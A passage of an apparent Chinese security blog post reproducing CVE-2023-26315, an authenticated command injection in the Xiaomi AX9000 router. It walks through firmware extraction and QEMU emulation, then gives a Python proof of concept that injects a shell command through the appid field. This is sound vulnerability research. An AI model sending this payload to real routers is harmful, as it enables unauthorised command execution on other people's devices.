<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>小米AX9000路由器CVE-2023-26315漏洞复现 | XiDP</title><meta name="author" content="XiDP"><meta name="copyright" content="XiDP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言本文参考 winmt 师傅的文章，复现其挖掘的小米 AX9000 路由器命令执行漏洞。本文大幅简化了分析流程，梳理并总结了所需工具与操作指令，旨在帮助读者快速完成该路由器的qemu仿真与漏洞复现。 漏洞概要国家信息安全漏洞共享平台CVE 记录：CVE-2023-26315  固件版本 ≤..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "小米AX9000路由器CVE-2023-26315漏洞复现",
  "url": "http://example.com/2025/11/05/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
  "image": "http://example.com/img/Qhead.png",
  "datePublished": "2025-11-04T16:00:00.000Z",
  "dateModified": "2025-11-06T06:19:22.602Z",
  "author": [
    {
      "@type": "Person",
      "name": "XiDP",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/Qhead.png"><link rel="canonical" href="http://example.com/2025/11/05/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '小米AX9000路由器CVE-2023-26315漏洞复现',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/loading.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yu2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XiDP</span></a><a class="nav-page-title" href="/"><span class="site-name">小米AX9000路由器CVE-2023-26315漏洞复现</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">小米AX9000路由器CVE-2023-26315漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-04T16:00:00.000Z" title="发表于 2025-11-05 00:00:00">2025-11-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-06T06:19:22.602Z" title="更新于 2025-11-06 14:19:22">2025-11-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT/">IOT</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:100,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-11-06 14:19:22&quot;}" hidden></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文参考 winmt 师傅的文章，复现其挖掘的小米 AX9000 路由器命令执行漏洞。本文大幅简化了分析流程，梳理并总结了所需工具与操作指令，旨在帮助读者快速完成该路由器的qemu仿真与漏洞复现。</p>
<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2024-23093">国家信息安全漏洞共享平台</a><br><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2023-26315">CVE 记录：CVE-2023-26315</a></p>
<ul>
<li>固件版本 ≤ 1.0.168</li>
<li>授权后命令注入漏洞<br>小米<code>AX9000</code>路由器在<code>1.0.168</code>版本及之前存在二进制漏洞（命令注入），该漏洞由于未对非法的<code>appid</code>做出有效限制而引起。已授权登录的攻击者在成功利用此漏洞后，可在远程目标设备上执行任意命令，并获得设备的最高控制权，造成权限提升</li>
</ul>
<h2 id="qemu系统仿真小米路由器AX9000"><a href="#qemu系统仿真小米路由器AX9000" class="headerlink" title="qemu系统仿真小米路由器AX9000"></a>qemu系统仿真小米路由器AX9000</h2><p>固件下载地址:<a target="_blank" rel="noopener" href="https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/ra70/miwifi_ra70_firmware_cc424_1.0.168.bin">固件下载</a><br>qemu-ARM64内核环境下载地址: <a target="_blank" rel="noopener" href="https://xidp0.github.io/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/">qemu搭建ARM64环境 | XiDP</a></p>
<h3 id="固件拆解"><a href="#固件拆解" class="headerlink" title="固件拆解"></a><strong>固件拆解</strong></h3><p>拆解固件过程如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me miwifi_ra70_firmware_cc424_1.0.168.bin</span><br><span class="line"><span class="built_in">cd</span> _miwifi_ra70_firmware_cc424_1.0.168.bin.extracted</span><br><span class="line">ubireader_extract_images 2B4.ubi // 得到的文件会放入在ubifs-root的2B4.ubi文件夹中(不执行这个指令是没有这个文件夹的)</span><br><span class="line"><span class="built_in">cd</span> ubifs-root</span><br><span class="line"><span class="built_in">cd</span> 2B4.ubi</span><br><span class="line">binwalk -Me img-870537086_vol-ubi_rootfs.ubifs</span><br><span class="line"><span class="built_in">cd</span> _img-870537086_vol-ubi_rootfs.ubifs.extracted</span><br></pre></td></tr></table></figure>

<h3 id="配置qemu虚拟机网络"><a href="#配置qemu虚拟机网络" class="headerlink" title="配置qemu虚拟机网络"></a><strong>配置qemu虚拟机网络</strong></h3><p>完成之后就可以启动我们已经配置好的<code>qemu虚拟机</code>(需要手动配置ip地址)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 使用./qemu-start.sh来启动qemu虚拟机</span><br><span class="line">// 启动完成之后登入root用户，密码为xidp</span><br><span class="line">// 之后按照下面指令配置ip地址</span><br><span class="line">ip add add 192.168.122.130/24 dev enp0s1</span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> enp0s1 up</span><br><span class="line">ip route add default via 192.168.122.1</span><br></pre></td></tr></table></figure>
<p>设置之后尝试ping一下主机来验证ip地址来查看是否设置成功</p>
<h3 id="patch修改文件"><a href="#patch修改文件" class="headerlink" title="patch修改文件"></a><strong>patch修改文件</strong></h3><p>为了能够跳过小米路由器的初始化这里需要patch其中的文件<br>patch的文件为<code>/squashfs-root/usr/sbin/sysapihttpd</code><br>找到如图所示部分进行修改将 <code>CBZ</code> 修改为 <code>CBNZ</code><br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
<h3 id="使用scp传输向qemu虚拟机传输文件"><a href="#使用scp传输向qemu虚拟机传输文件" class="headerlink" title="使用scp传输向qemu虚拟机传输文件"></a><strong>使用scp传输向qemu虚拟机传输文件</strong></h3><p><code>patch</code>之后替换掉原本的文件随后使用<code>scp</code>传入<code>qemu虚拟机</code>中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 在Ubuntu物理机中压缩并传输</span><br><span class="line">tar -czf squashfs-root.tar.gz ./squashfs-root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa squashfs-root.tar.gz root@192.168.122.130:/root/</span><br><span class="line">// 下面在qemu虚拟机中解压</span><br><span class="line">tar -xzf squashfs-root.tar.gz</span><br></pre></td></tr></table></figure>

<p>使用这个方法会出现一个问题，明明使用root用户传输密码是对的，但是它就是显示不对，这是并不是密码的缘故而是ssh禁止了使用root用户登入<br>我们需要做一个修改，否则后续依旧只能使用普通用户来传输很麻烦</p>
<p>在root用户下使用下面指令修改ssh配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>修改完毕之后重启ssh服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<p>然后再次使用上述scp指令就可以进行传输了</p>
<h3 id="启动httpd服务"><a href="#启动httpd服务" class="headerlink" title="启动httpd服务"></a><strong>启动httpd服务</strong></h3><p>之后就可以准备启动httpd服务<br>执行下面几个指令(这里是按照wimmt师傅文章中的内容做了一个总结，只需要按照顺序复制粘贴到qemu虚拟机中就可以成功启动小米路由器的仿真)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/squashfs-root</span><br><span class="line">mount --<span class="built_in">bind</span> /proc proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev dev</span><br><span class="line"><span class="built_in">chroot</span> . /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/run</span><br><span class="line"><span class="built_in">touch</span> /var/run/ubus.sock</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line"><span class="built_in">touch</span> /var/lock/procd_sysapihttpd.lock</span><br><span class="line"></span><br><span class="line">/sbin/procd &amp;</span><br><span class="line"><span class="built_in">sleep</span> 3</span><br><span class="line">/sbin/ubusd &amp;</span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;WAUST-8WAUDT&quot;</span> &gt; /etc/TZ</span><br><span class="line"></span><br><span class="line">/etc/init.d/sysapihttpd start</span><br></pre></td></tr></table></figure>

<p>执行之后就可以访问 <code>192.168.122.130</code><br>它会自动定位到这里路由器的初始化配置页面<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>因为初始化部分和硬件相关所以我们需要想个办法绕过<br>也就是执行下面这两个指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> xiaoqiang.common.INITTED=1</span><br><span class="line">uci commit</span><br><span class="line">// 输出验证是否成功写入</span><br><span class="line">uci show | grep INITTED </span><br></pre></td></tr></table></figure>

<p>设置好之后再次访问就可以绕过初始化配置，直接跳转到登入页面<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
<p><code>注意这里是重新访问，不是刷新界面</code><br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>由于我们复现的<code>CVE-2023-26315</code>是一个授权认证后的漏洞，因此我们需要设置登录密码以登录进后台拿到<code>token</code>的值</p>
<p>所以下面我们需要尝试登入它<br>阅读它的web页面源码来查看它的密码的加密逻辑是什么<br><code>F12</code>之后查看<code>web</code>内容，分别在<code>440行</code>和<code>1722行</code>可以看到</p>
<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
<p>由此可以看出，我们的用户名是固定为<code>admin</code>，而密码是通过一个叫 <code>oldPwd()函数</code> 加密之后的结果。<br>这个 <code>oldPwd()函数</code> 将<code>用户提交的密码</code>和一个固定的<code>key = a2ffa5c9be07488bbb04a3a47d3c5f6a</code>组合之后使用<code>sha1哈希</code>进行一个加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真实密码 = sha1(用户设置的密码 + a2ffa5c9be07488bbb04a3a47d3c5f6a)</span><br></pre></td></tr></table></figure>

<p>下面我们假设我们设置的用户密码为 <code>xidp</code><br>那么我们需要给<code>account.common.admin</code>这个<code>uci</code>配置为<code>sha1(xidpa2ffa5c9be07488bbb04a3a47d3c5f6a)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1(xidpa2ffa5c9be07488bbb04a3a47d3c5f6a) = <span class="number">32</span>c98a6b9ffd5226b7ca5e8336e2e50bbfa6fb10</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
<p>那么我们使用下面指令来设置密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> account.common.admin=32c98a6b9ffd5226b7ca5e8336e2e50bbfa6fb10</span><br><span class="line">uci commit</span><br><span class="line">uci show | grep admin</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
<p>下面就可以成功使用密码xidp登入了<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
<h3 id="没用的部分"><a href="#没用的部分" class="headerlink" title="没用的部分"></a><strong>没用的部分</strong></h3><p>也是进入到这个界面发现这个小米路由器AX9000的造型看起来有点酷<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
<p>本来想淘宝买一个看看能不能实机打一下，淘宝看了一下价格感觉还是算了<code>o(╥﹏╥)o</code><br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.jpg"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里先简单使用winmt师傅的PoC来演示漏洞效果，随后再介绍漏洞成因</p>
<p>这里先对着这个小米路由器的配置界面抓个包，得到我们现在的token值<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png"></p>
<p>抓包得到的内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/luci/;stok=<span class="number">26</span>a8470f16d4a0c8a03a8e503549b3ee/web/home HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.122</span><span class="number">.130</span></span><br><span class="line">Cookie: __guid=<span class="number">82176214.4122683288115647000</span><span class="number">.1762159952222</span><span class="number">.404</span>; monitor_count=<span class="number">6</span>; psp=admin|||<span class="number">2</span>|||<span class="number">0</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="number">140.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">140.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Priority: u=0, i</span></span><br><span class="line"><span class="comment">Te: trailers</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br></pre></td></tr></table></figure>

<p>可以得知我们的<code>token=26a8470f16d4a0c8a03a8e503549b3ee</code></p>
<p>然后qemu虚拟机启动这两个服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/datacenter &amp;</span><br><span class="line">/usr/sbin/plugincenter &amp;</span><br></pre></td></tr></table></figure>

<p>接着编写我们的PoC，如下所示(我本来是想拿shell的，但是尝试几次之后都没有连接上，不知道什么原因，为了展示命令执行成功，我将指令换成了创建文件666666)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">server_ip = <span class="string">&quot;192.168.122.130&quot;</span></span><br><span class="line">token = <span class="string">&quot;26a8470f16d4a0c8a03a8e503549b3ee&quot;</span></span><br><span class="line"></span><br><span class="line">test_cmd = <span class="string">&quot;;touch /tmp/666666 #&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(</span><br><span class="line">    <span class="string">&quot;http://&#123;&#125;/cgi-bin/luci/;stok=&#123;&#125;/api/xqdatacenter/request&quot;</span>.<span class="built_in">format</span>(server_ip, token), </span><br><span class="line">    data=&#123;<span class="string">&#x27;payload&#x27;</span>:<span class="string">&#x27;&#123;&quot;api&quot;:629, &quot;appid&quot;:&quot;&#x27;</span> + test_cmd + <span class="string">&#x27;&quot;&#125;&#x27;</span>&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;响应:&quot;</span>, res.text)</span><br></pre></td></tr></table></figure>

<p>接着运行我们的脚本</p>
<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png"></p>
<p>到这里就算是成功复现了，我们可以直接使用指令退出我们的qemu虚拟机了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -h now </span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>复现成功之后我们再来看我们这命令执行漏洞具体产生的原因是什么<br>小米路由器的前端是使用Lua来编写的，而且其中存放的Lua文件并不是源码而是已经编译后的二进制文件，同时小米对Lua的解释器做了魔改。</p>
<p>但是没有关系github上已经有了专门针对小米路由器Lua的反编译工具: <a target="_blank" rel="noopener" href="https://github.com/NyaMisty/unluac_miwifi">NyaMisty&#x2F;unluac_miwifi</a></p>
<h3 id="Lua反汇编和分析"><a href="#Lua反汇编和分析" class="headerlink" title="Lua反汇编和分析"></a><strong>Lua反汇编和分析</strong></h3><p>由于需要反编译的数量比较多，所以我们简单写一个脚本来批量反编译</p>
<p>修改脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">source_base = <span class="string">&quot;/home/xidp/myfile/iot/xiaomi_ax9000/_miwifi_ra70_firmware_cc424_1.0.168.bin.extracted/ubifs-root/2B4.ubi/_img-870537086_vol-ubi_rootfs.ubifs.extracted/squashfs-root/usr/&quot;</span></span><br><span class="line">output_base = <span class="string">&quot;/home/xidp/myfile/iot/xiaomi_ax9000/luac&quot;</span>  <span class="comment"># 指定输出目录</span></span><br><span class="line"></span><br><span class="line">os.makedirs(output_base, exist_ok=<span class="literal">True</span>)</span><br><span class="line">res = os.popen(<span class="string">f&quot;find <span class="subst">&#123;source_base&#125;</span> -name *.lua&quot;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res)):</span><br><span 